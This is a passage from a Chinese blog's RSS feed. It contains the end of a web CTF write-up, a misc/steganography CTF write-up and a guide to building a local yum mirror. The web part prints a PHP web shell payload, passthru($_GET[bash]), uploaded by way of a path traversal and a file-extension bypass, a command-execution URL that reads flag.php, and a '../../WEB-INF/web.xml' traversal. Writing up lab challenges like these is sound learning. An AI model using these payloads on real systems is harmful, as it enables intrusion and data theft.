title="13.i-got-id-200"></a>13.i-got-id-200</h2><p>初始界面是这样的，点进files，是一个文件上传界面，url中页面文件格式是.pl,可知是perl语言编写的，通过多次上传图片文件，文本格式文件，发现都会输出成文本，</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image110.jpg" alt="img"></p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image112.jpg" alt="img"></p><p>由此猜测是这样的编程格式</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image114.jpg" alt="img"></p><p>param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。</p><p>ARGV是PERL默认用来接收参数的数组,不管脚本里有没有把它写出来,它始终是存在的。</p><p>所以在上传文件进行拦包改包，添加avgv参数，通过测试发现成功</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image116.jpg" alt="img"></p><p>猜测目录下可能存在flag文件成功读取flag值</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image118.jpg" alt="img"></p><h2 id="14-ics-07"><a href="#14-ics-07" class="headerlink" title="14.ics-07"></a>14.ics-07</h2><p>打开进去指定页面url个page参数，并且下方可以查看源代码</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image120.jpg" alt="img"></p><p>源代码中可以看出要绕过id</p><p>绕过要注意的三个点为：</p><p>（1）floatval（$ _ GET [id]）！==’1’ //浮点不为1</p><p>（2）substr（$ _ GET [id]，-1）===’9‘ //id最后一位为9</p><p>（3）Mysql查询结果限制，id不能过大，</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image122.jpg" alt="img"></p><p>构建exp ?page=&amp;id=1/9&amp;submit=提交查询#，可得到admin，</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image124.jpg" alt="img"></p><p>再根据源代码审计，post方式提交一个文件，真实的上传路径是uploaded，</p><p>进行文件过滤，要注意的三个点为：</p><p>（1）$filename = “backup/“.$file; //目录为假目录，传入file时，加上一个../</p><p>（2）’/.+.ph(p[3457]?|t|tml)$/i’ //正则过滤文件只匹配最后一个点的后缀，可以写入两次.php</p><p>（3）真实上传目录为upload</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image126.jpg" alt="img"></p><p>构建exp为file=../123.php/1.php/..&amp;con=&lt;?php passthru($_GET[bash]);?&gt;,用post方式进行传递</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image128.jpg" alt="img"></p><p>访问:<a href="http://111.198.29.45:55105/uploaded/123.php?bash=cat ../flag.php" target="_blank" rel="noopener">http://111.198.29.45:55105/uploaded/123.php?bash=cat%20../flag.php</a></p><p>查看源代码得到flag值</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image130.jpg" alt="img"></p><h2 id="15-Web2"><a href="#15-Web2" class="headerlink" title="15.Web2"></a>15.Web2</h2><p>点进去后发现是解密的题</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image132.jpg" alt="img"></p><p>审计后我们先解密$_变量</p><p>a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws</p><p>str_rot13 — 对字符串执行 ROT13 转换 =》rot13解密</p><p>n1mYotDfPRFRVdEYjhDNlZjYld2Y5IjOkdTN3EDNlhzM0gzZiFTZ2MjO4gjf</p><p>strrev — 反转字符串 =》fjg4OjM2ZTFiZzg0MzhlNDE3NTdkOjI5Y2dlYjZlNDhjYEdVRFRPfDtoYm1n</p><p>base64解码=》~88:36e1bg8438e41757d:29cgeb6e48c`GUDTO|;hbmg</p><p>由此构建php文件</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image134.jpg" alt="img"></p><p>这里需要翻转一下$_变量</p><p>解析php文件得到flag值</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image136.jpg" alt="img"></p><h2 id="16-Website"><a href="#16-Website" class="headerlink" title="16.Website"></a>16.Website</h2><p>是一个是登录页面，首先扫一下目录，扫出一个test.php页面，base64的值解密出来是乱码，</p><p>返回注册一个用户，并登录，</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image138.jpg" alt="img"></p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image140.jpg" alt="img"></p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image142.jpg" alt="img"></p><p>登录后，好像普通用户无法等到flag值，查看cookie值并尝试修改cookie值为刚才的base64,刷新后发现是admin账户了，并且等到flag值</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image144.jpg" alt="img"></p><h2 id="17-Zhuanxv——javaweb-HQL注入"><a href="#17-Zhuanxv——javaweb-HQL注入" class="headerlink" title="17.Zhuanxv——javaweb HQL注入"></a>17.Zhuanxv——javaweb HQL注入</h2><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image146.jpg" alt="img"></p><p>整一个静态界面，源码也找不出什么，目录扫描烧到list目录进入后到登录界面</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image148.jpg" alt="img"></p><p>在github找到Zhuanxv application的项目，<a href="https://github.com/Lazyboxx/zhuanxvapplication" target="_blank" rel="noopener">https://github.com/Lazyboxx/zhuanxvapplication</a></p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image150.jpg" alt="img"></p><p>用初始账号密码登录失败，爆破一下密码，密码是：6yhn7ujm</p><p>登录进去发现没有利用的点，查看登录界面的源代码，进行审计发现有一个可疑的参数，进行文件包含下载</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image152.jpg" alt="img"></p><p>在从github项目committed的历史记录中可以知道使用maven框架搭建的web</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image154.jpg" alt="img"></p><p>因为使用javaweb的maven框架，有通用的目录结构</p><p><img src="/2020/07/11/攻防世界web 部分wp/clip_image156.jpg" alt="img"></p><p><a href="http://111.198.29.45:37888/loadimage?fileName=../../WEB-INF/web.xml" target="_blank" rel="noopener">http://111.198.29.45:37888/loadimage?fileName=../../WEB-INF/web.xml</a></p><p>下载web.xml</p><p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>]]></content:encoded>
      
      <comments>https://www.jaie.cc/2020/07/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%20%E9%83%A8%E5%88%86wp/#disqus_thread</comments>
    </item>
    
    <item>
      <title>攻防世界misc新手区 Wiretup</title>
      <link>https://www.jaie.cc/2020/07/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E5%8C%BAwp/</link>
      <guid>https://www.jaie.cc/2020/07/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E5%8C%BAwp/</guid>
      <pubDate>Fri, 10 Jul 2020 22:45:43 GMT</pubDate>
      <description>
      
        
        
          &lt;h5 id=&quot;1-this-is-flag&quot;&gt;&lt;a href=&quot;#1-this-is-flag&quot; class=&quot;headerlink&quot; title=&quot;1.this_is_flag&quot;&gt;&lt;/a&gt;1.this_is_flag&lt;/h5&gt;&lt;p&gt;标线即为flag值&lt;/p&gt;
&lt;p&gt;&lt;img 
        
      
      </description>
      
      <content:encoded><![CDATA[<h5 id="1-this-is-flag"><a href="#1-this-is-flag" class="headerlink" title="1.this_is_flag"></a>1.this_is_flag</h5><p>标线即为flag值</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925193107.png" alt></p><h5 id="2-ext3"><a href="#2-ext3" class="headerlink" title="2.ext3"></a>2.ext3</h5><p>下载文件后放进linux，flie命令查看是什么文件，可以看到是磁盘文件，将其挂载</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925192125.png" alt></p><p>可以查看flag文本文件，cat查看得base64的编码，进行转换得flag值</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/1569410688357.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925192912.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925193015.png" alt></p><h5 id="3-give-you-flag"><a href="#3-give-you-flag" class="headerlink" title="3.give_you_flag"></a>3.give_you_flag</h5><p>下载后是一张gif有一副二维码的图片，用Stegsolve保存二维码的图片</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/1569411485042.png" alt></p><p>用ps软件修复二维码图片，二维码扫出来即为flag值</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925204440.png" alt></p><h5 id="4-pdf"><a href="#4-pdf" class="headerlink" title="4.pdf"></a>4.pdf</h5><p>下载后是一个pdf文件，将pdf转换word文件，我这里用wps自带转换</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925205144.png" alt></p><p>打开转换的word，删除图片或移动缩小图片，即可看见图片下藏着flag值</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925205403.png" alt></p><h5 id="5-stegano"><a href="#5-stegano" class="headerlink" title="5.stegano"></a>5.stegano</h5><p>将pdf用浏览器打开选择全选，复制到记事本里去，可以发现AABB的一段文字，是摩斯电码，A是点，B是划<br>等到-.-. — -. –. .-. .- - ..- .-.. .- - .. — -. … –..– ..-. .-.. .- –. —… .—- -. …- .—- ….. .—- -… .-.. …– – …– ….. ….. ….- –. …–转化成字母即为flag</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925210906.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925211421.png" alt></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/1569417314520.png" alt></p><p>flag格式是flag{1nv151bl3m3554g3}</p><h5 id="6-SimpleRAR"><a href="#6-SimpleRAR" class="headerlink" title="6.SimpleRAR"></a>6.SimpleRAR</h5><p>下载后是一个压缩包，用winhex查看一下，可以secret.png文件，把A8 3C 7A修改为A8 3C 74,这个是RAR对png文件头的编码.解压可以看到一张png图片，显示空白</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190927152141.png" alt></p><p>再用winhex打开png图片，可以看到GIF文件头，GIF (gif)，文件头：47494638，把png文件格式改为gif</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190927152912.png" alt></p><p>把gif发到stesolve跑一下，只弄出来一半。</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190927165900.png" alt></p><p>再把gif丢进ps里，是两个图层的，导出另一图层的一张，再丢进stegsolve跑下，跑出二维码破碎的上部分</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190927165340.png" alt></p><p>再报这两张图片丢进ps，ps修复一下，flag{yanji4n_bu_we1shi}</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/1569575056008.png" alt></p><h5 id="7-坚持60s"><a href="#7-坚持60s" class="headerlink" title="7.坚持60s"></a>7.坚持60s</h5><p>用jd-gui 打开下载的java程序，搜索关键字flag，得到是base64编码进行转化</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925215533.png" alt></p><h5 id="8-gif"><a href="#8-gif" class="headerlink" title="8.gif"></a>8.gif</h5><p>下载是个压缩包，进行解压时一堆黑白的图片，可以联想二进制，白是0，黑是1二进制转换成字符串，得flag值</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925220606.png" alt></p><h5 id><a href="#" class="headerlink" title></a><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925220759.png" alt></h5><h5 id="9-掀桌子"><a href="#9-掀桌子" class="headerlink" title="9.掀桌子"></a>9.掀桌子</h5><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925221346.png" alt></p><p>每两个一组，将16进制转换为10进制，减去128以后输出 ascii</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925221212.png" alt></p><h5 id="10-如来十三掌"><a href="#10-如来十三掌" class="headerlink" title="10.如来十三掌"></a>10.如来十三掌</h5><p>打开是与佛论禅，到<a href="http://keyfc.net/bbs/tools/tudoucode.aspx解密，佛了。" target="_blank" rel="noopener">http://keyfc.net/bbs/tools/tudoucode.aspx解密，佛了。</a></p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925231312.png" alt></p><p>解 rot-13 ，得到ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9<br>在base64解码flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190925231346.png" alt></p><h5 id="11-base64stego"><a href="#11-base64stego" class="headerlink" title="11.base64stego"></a>11.base64stego</h5><p>下载来一个解压包，需要密码，伪加密来着，用winrar修复功能修复一下就可以打开了，打开一大串base64，应该是吧，直接解解不出来</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008195850.png" alt></p><p>参考<a href="https://www.tr0y.wang/2017/06/14/Base64steg/" target="_blank" rel="noopener">https://www.tr0y.wang/2017/06/14/Base64steg/</a>使用脚本处理一下</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20191008200132.png" alt></p><h5 id="12-功夫再高也怕菜刀"><a href="#12-功夫再高也怕菜刀" class="headerlink" title="12.功夫再高也怕菜刀"></a>12.功夫再高也怕菜刀</h5><p>下载下来是个流量包，binwalk跑一下，里面还包含一个zip，foremost分离文件  ，zip包需要密码，不是弱密码</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190927103452.png" alt></p><p>分析流量包，搜索flag.txt关键字，在1150行，追踪tcp流量流，发现jpg十六进制加密，还原jpg图片，图片文字即压缩包密码，</p><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190927115637.png" alt></p><p>flag值为：<img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190927115842.png" alt></p>]]></content:encoded>
      
      <comments>https://www.jaie.cc/2020/07/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cmisc%E6%96%B0%E6%89%8B%E5%8C%BAwp/#disqus_thread</comments>
    </item>
    
    <item>
      <title>搭建本地yum服务器</title>
      <link>https://www.jaie.cc/2020/07/11/%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0yum%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
      <guid>https://www.jaie.cc/2020/07/11/%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0yum%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
      <pubDate>Fri, 10 Jul 2020 22:45:43 GMT</pubDate>
      <description>
      
        
        
          &lt;h5 id=&quot;1-在linux安装apache&quot;&gt;&lt;a href=&quot;#1-在linux安装apache&quot; class=&quot;headerlink&quot; title=&quot;1.在linux安装apache&quot;&gt;&lt;/a&gt;1.在linux安装apache&lt;/h5&gt;&lt;p&gt;我这里是拿kali虚拟机自带
        
      
      </description>
      
      <content:encoded><![CDATA[<h5 id="1-在linux安装apache"><a href="#1-在linux安装apache" class="headerlink" title="1.在linux安装apache"></a>1.在linux安装apache</h5><p>我这里是拿kali虚拟机自带的apache做中间件。<br><code>dpkg  -L apache2</code>查看apache相关的文件,在/var/www下web网页放置<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710202523.png" alt>  </p><h5 id="2-虚拟机挂载cent光盘"><a href="#2-虚拟机挂载cent光盘" class="headerlink" title="2.虚拟机挂载cent光盘"></a>2.虚拟机挂载cent光盘</h5><p><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710220103.png" alt><br><code>df -h</code> 列出文件系统、找出光盘的文件系统，<br><code>mount /dev/sr1 /mnt/cdrom</code>挂载/dev/sr1到/mnt/cdrom<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710220701.png" alt></p><h5 id="3-将光盘的安装包拷贝到web目录下"><a href="#3-将光盘的安装包拷贝到web目录下" class="headerlink" title="3.将光盘的安装包拷贝到web目录下"></a>3.将光盘的安装包拷贝到web目录下</h5><p><code>mkdir /var/www/centos</code> 创建目录 /var/www/centos <br><br><code>mkdir /var/www/centos/x86_64</code>创建目录/var/www/centos/x86_64<br><br><code>mkdir /var/www/centos/extra</code>创建目录/var/www/centos/extra<br><br><code>mkdir /var/www/centos/update</code>创建目录/var/www/centos/update<br><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710222523.png" alt><br><br><code>cd /mnt/cdrom/</code><br><br><code>ls</code>进入挂载光盘的目录  查看光盘文件<br><code>cp Packages/* /var/www/centos/x86_64/</code> 把 Packages/下的软件包复制到/var/www/centos/x86_64/目录下，<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710221216.png" alt><br><code>apt-get install -y createrepo</code>下载createrepo，目的是生成repodata目录<br><br><code>createrepo -pdo /var/www/centos/x86_64 /var/www/centos/x86_64</code><br><br><code>createrepo -pdo /var/www/centos/extra /var/www/centos/extra</code><br><br><code>createrepo -pdo /var/www/centos/update /var/www/centos/eupdate</code><br><br>重启一下apache服务<code>service apache2 restart</code><br><br>测试访问web网页，ip为虚拟机的<br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710223500.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710223704.png" alt><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710231018.png" alt><br><br>4.客户端配置访问yum源服务器<br><code>vim /etc/yum.repos.d/CentOS-Base.repo</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190719170252.png" alt><br><code>yum clean all</code> 清除所有缓存<br><code>yum makecache</code> 重新下载缓存<br>可以发现已经可以了，现在测试一下，下载一个tree包试一下<br><code>yum install tree -y</code><br><br>可能cdrom里面的包不够多，我们同步一下163远程的包，用rsync协议<br><code>rsync -avrt --delete rsync://mirrors.163.com/centos/6/updates/x86_ 64/Packages/ /var/www/centos/update</code><br><img src="https://jaie-1256725437.cos.ap-guangzhou.myqcloud.com/pic/20190710234653.png" alt></p>]]></content:encoded>
      
      <comments>https://www.jaie.cc/2020/07/11/%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0yum%E6%9C%8D%E5%8A%A1%E5%99%A8/#disqus_thread</comments>
    </item>
    
  </channel>
</rss>
